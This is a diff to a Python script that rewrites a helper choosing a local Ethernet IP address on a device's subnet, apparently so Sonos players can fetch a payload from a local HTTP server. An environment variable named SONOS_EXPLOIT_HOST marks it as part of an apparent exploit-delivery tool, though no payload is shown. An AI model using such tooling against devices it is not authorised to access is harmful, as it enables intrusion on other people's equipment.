@@ -44,18 +44,29 @@ def pick_protocol(sink):
 
 
 def local_host(device):
-    """The Mac address inside the device's /24. The players only fetch reliably from their own
-    subnet (2026-11-20: 192.168.4.x server + a 192.168.6.x client stalls after one fetch)."""
-    try:
-        dev = ".".join(device.split(".")[:3]) + "."
-        out = subprocess.run(["ifconfig"], capture_output=True, text=True).stdout
-        for line in out.splitlines():
-            m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
-            if m and m.group(1).startswith(dev):
-                return m.group(1)
-    except Exception:
-        pass
-    return "192.168.4.160"
+    """The Mac address inside the device's own /24, on a real Ethernet interface.
+
+    The players only fetch reliably from their own subnet (2026-11-20), and they do **not** follow
+    a freshly added alias either: 192.168.4.200 was set on en0 and the unit fetched nothing until the
+    long-established 192.168.4.160 was used. So: env override, then a proven address, then the first
+    match on an `en*` interface (never utun/bridge/awdl)."""
+    env = os.environ.get("SONOS_EXPLOIT_HOST")
+    if env:
+        return env
+    dev = ".".join(device.split(".")[:3]) + "."
+    cands, iface = [], None
+    for line in subprocess.run(["ifconfig"], capture_output=True, text=True).stdout.splitlines():
+        m = re.match(r"^([a-z0-9]+):", line)
+        if m:
+            iface = m.group(1)
+            continue
+        a = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
+        if a and a.group(1).startswith(dev) and iface and iface.startswith("en"):
+            cands.append(a.group(1))
+    for proven in ("192.168.4.160", "192.168.5.160", "192.168.6.160"):
+        if proven in cands:
+            return proven
+    return cands[0] if cands else "192.168.4.160"
 
 def _server(host, port, payload_dir):
     class H(http.server.BaseHTTPRequestHandler):
